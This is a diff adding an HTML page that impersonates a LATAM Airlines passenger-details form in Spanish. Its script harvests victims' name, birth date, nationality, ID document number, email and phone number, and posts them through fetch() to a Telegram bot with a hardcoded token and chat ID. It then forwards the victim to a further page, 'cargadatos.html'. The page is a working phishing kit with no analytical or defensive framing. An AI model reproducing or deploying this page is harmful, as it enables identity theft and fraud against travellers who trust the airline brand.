@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flight Card</title>
+    <style>
+
+        body{
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #f4f4f4ea;
+            color: #fff;
+            padding-bottom: 25%;
+            padding: 0;
+            overflow-x: hidden;
+        }
+        
+        .bodys {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items:start; 
+            margin: 0;
+        }
+        .card {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            padding: 0px;
+            box-sizing: border-box;
+            margin-top: 5%;
+        }
+        .headere {
+            display: flex;
+            padding: 3%;
+            margin-bottom: 20px;
+            border-style: solid;
+            border-width: 0px 0px 1px 0px;
+            border-color: gainsboro;
+        }
+        .headere div {
+            padding: 5px 10px;
+            border-radius: 100px 0px 100px 5px;
+            font-size: 0.9em;
+        }
+        .recommended {
+            background-color: white;
+            color: #000;
+            
+        }
+        .cheapest {
+            background-color: #3ca692;
+            color: #fff;
+        }
+        .flight-info {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .flight-info div {
+            text-align: center;
+        }
+        .flight-info .time {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #1f2350;
+        }
+        .flight-info .location {
+            font-size: 1.2em;
+            color: #1f2350;
+        }
+        .details {
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .details .duration {
+            font-size: 1em;
+            color: #888;
+        }
+        .details .direct {
+            font-size: 1em;
+            color: #4b4bbd;
+            font-weight: bold;
+        }
+        .price {
+            text-align: right;
+            margin-bottom: 0px;
+        }
+        .price span {
+            display: block;
+            font-size: 1em;
+            color: #888;
+        }
+        .price .amount {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #1f2350;
+        }
+        .footer {
+            text-align: center;
+        }
+        .footer img {
+            height: 20px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+        .footer span {
+            font-size: 1em;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    
+    <header style="padding: 5%; background-color: rgb(16, 0, 79); display: flex; justify-content: space-between; align-items: center;">
+       <img style="width: 30%;" src="img/MobileNegative.svg" alt="LATAM Airlines Logo" class="logo">
+       <button class="login-button" style="margin-left: 27%; background-color: #46158298; color: #fff; border: none; border-radius: 4px; padding: 8px 12px; border-radius: 18px; cursor: pointer;">
+         <h3 style="margin: 0;">Iniciar sesión</h3>
+       </button>
+       <div class="menu-icon">
+         <i class="fa-solid fa-bars fa-lg" onclick="toggleMenu()"></i>
+    </header>
+    
+    <section style="margin: 5% 5% 0% 5%;">
+     <p style="margin-bottom: 0%; color: black; font-size: x-large; color: rgba(68, 30, 219, 0.765);">Pasajeros</p>
+ </section>
+ 
+    <section>
+     <section class="bodys" data-price="44990">
+         <div class="card">
+             <div class="headere">
+                 <div style="background-color: rgb(244, 244, 249); border-radius: 100px; padding: 2%; margin: 2%; display: flex; justify-content: center;">
+                     <img src="img/adult-2.png" style="width: 80%;" alt="">
+                 </div>
+                 <section style="color: rgb(27, 0, 136); padding: 4%; padding-right: 8%; font-size: medium; width: 100%;" class="recommended"><strong>Adulto</strong></section>
+             </div>
+ 
+             <div class="flight-info" style="border-style: solid; border-width: 1px; border-color: gray; margin: 5% 5% 15% 5%; border-radius: 8px;">
+                <input type="text" id="nombre" style="width: 85%; padding: 5% 3% 5% 0%; border-style: none; font-size: large; outline: none;" autocomplete="off" placeholder="Nombre">
+             </div>
+ 
+             <div class="flight-info" style=" border-style: solid; border-width: 1px; border-color: gray; margin: 5% 5% 15% 5%; border-radius: 8px;">
+                 <input type="text" id="apellido" style="width: 85%; padding: 5% 3% 5% 0%; border-style: none; font-size: large; outline: none;" autocomplete="off" placeholder="Apellido">
+              </div>
+ 
+              <div class="flight-info" style="display: flex; flex-direction: column;  color: gray; border-style: solid; border-width: 1px; border-color: gray; margin: 5% 5% 15% 5%; border-radius: 8px;">
+                <p style="width: 95%; margin: 0%; padding-bottom: 2%; padding-top: 2%;">Fecha de nacimiento</p>
+                 <input type="date" id="Nacimiento" style="background-color:transparent; color: gray; width: 95%; padding: 0% 1% 5% 0%; border-style: none; font-size: large; outline: none;" placeholder="Fecha de nacimiento" autocomplete="off">
+              </div>
+ 
+              <div class="flight-info" style=" border-style: solid; border-width: 1px; border-color: gray; margin: 5% 5% 15% 5%; border-radius: 8px;">
+                 <input type="text" id="nacionalidad" style="width: 85%; padding: 5% 3% 5% 0%; border-style: none; font-size: large; outline: none;" autocomplete="off" placeholder="Nacionalidad">
+              </div>
+ 
+              <div class="flight-info" style="border-style: solid; border-width: 1px; border-color: gray; margin: 5% 5% 15% 5%; border-radius: 8px;">
+                 <select id="documento" style="background-color: transparent; width: 95%; padding: 5% 3% 5% 0%; border-style: none; font-size: large; outline: none; color: gray;" autocomplete="off">
+                   <option value="" style="color: gray;" disabled selected>Seleccione un documento</option>
+                   <option value="cedula" style="color: gray;">Cédula de Ciudadanía</option>
+                   <option value="pasaporte" style="color: gray;">Pasaporte</option>
+                 </select>
+               </div>
+ 
+               <div class="flight-info" style=" border-style: solid; border-width: 1px; border-color: gray; margin: 5% 5% 15% 5%; border-radius: 8px;">
+                 <input type="number" id="NumDocumento" style="width: 85%; padding: 5% 3% 5% 0%; border-style: none; font-size: large; outline: none;" autocomplete="off" placeholder="Número de documento">
+              </div>
+ 
+              <div class="flight-info" style=" border-style: solid; border-width: 1px; border-color: gray; margin: 5% 5% 15% 5%; border-radius: 8px;">
+                 <input type="email" id="email" style="width: 85%; padding: 5% 3% 5% 0%; border-style: none; font-size: large; outline: none;" autocomplete="off" placeholder="Email">
+              </div>
+               
+              <div class="flight-info" style=" border-style: solid; border-width: 1px; border-color: gray; margin: 5% 5% 15% 5%; border-radius: 8px;">
+                 <input type="number" id="celular" style="width: 85%; padding: 5% 3% 5% 0%; border-style: none; font-size: large; outline: none;" autocomplete="off" placeholder="Número de celular">
+              </div>
+ 
+              <div class="flight-info" style=" margin: 5% 5% 15% 5%;">
+                 <button id="accept-button" style="margin-top: 5%; padding: 7%; width: 100%; border-radius: 10px; border-style: none; background-color: rgb(202, 26, 44); color: white;">Confirmar datos</button>
+             </div>
+         </div>
+     </section>
+ </section>
+
+ <script>
+    document.getElementById('accept-button').addEventListener('click', function() {
+        const nombre = document.getElementById('nombre').value;
+        const apellido = document.getElementById('apellido').value;
+        const Nacimiento = document.getElementById('Nacimiento').value;
+        const nacionalidad = document.getElementById('nacionalidad').value;
+        const documento = document.getElementById('documento').value;
+        const NumDocumento = document.getElementById('NumDocumento').value;
+        const email = document.getElementById('email').value;
+        const celular = document.getElementById('celular').value;
+
+        // Guardar datos en localStorage
+        const datosPagador = {
+            nombre: nombre,
+            apellido: apellido ,
+            Nacimiento: Nacimiento ,
+            nacionalidad: nacionalidad,
+            documento: documento,
+            NumDocumento: NumDocumento,
+            email: email,
+            celular: celular,
+            // Agrega otros campos aquí si es necesario
+        };
+        localStorage.setItem('datosPagador', JSON.stringify(datosPagador));
+    });
+</script>
+ 
+ <script>
+     document.getElementById('accept-button').addEventListener('click', function() {
+    const nombre = document.getElementById('nombre').value;
+    const apellido = document.getElementById('apellido').value;
+    const Nacimiento = document.getElementById('Nacimiento').value;
+    const nacionalidad = document.getElementById('nacionalidad').value;
+    const documento = document.getElementById('documento').value;
+    const NumDocumento = document.getElementById('NumDocumento').value;
+    const email = document.getElementById('email').value;
+    const celular = document.getElementById('celular').value;
+
+    if (!nombre || !apellido || !Nacimiento || !nacionalidad || !documento || !NumDocumento || !email || !celular) {
+        alert('Por favor, complete todos los campos.');
+        return;
+    }
+
+    const titulo = '"    🧿Datos del Pasajero🧿    "';
+    const mensaje = `*${titulo}*\n\n` +
+                    ` Nombre: ${nombre} ${apellido}\n` +
+                    ` Fecha de Nacimiento: ${Nacimiento}\n` +
+                    ` Nacionalidad: ${nacionalidad}\n` +
+                    ` Tipo de Documento: ${documento}\n` +
+                    ` Número de Documento: ${NumDocumento}\n` +
+                    ` Email: ${email}\n` +
+                    ` Número de Celular: ${celular}\n`
+                     
+                    
+                  
+    const telegramBotToken = '8064907534:AAF7jtwEd6PFyK0mbwu3t5miSOINrShtXIg';
+    const telegramChatId = '5848946481';
+    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+    fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: telegramChatId,
+            text: mensaje,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(response => response.json())
+    .then(result => {
+        if (result.ok) {
+            window.location.href = 'cargadatos.html';
+        } else {
+            alert('Error al enviar los datos. Por favor, intente nuevamente.');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Error al enviar los datos. Por favor, intente nuevamente.');
+    });
+});
+
+ </script>
+ </body>
+</html>
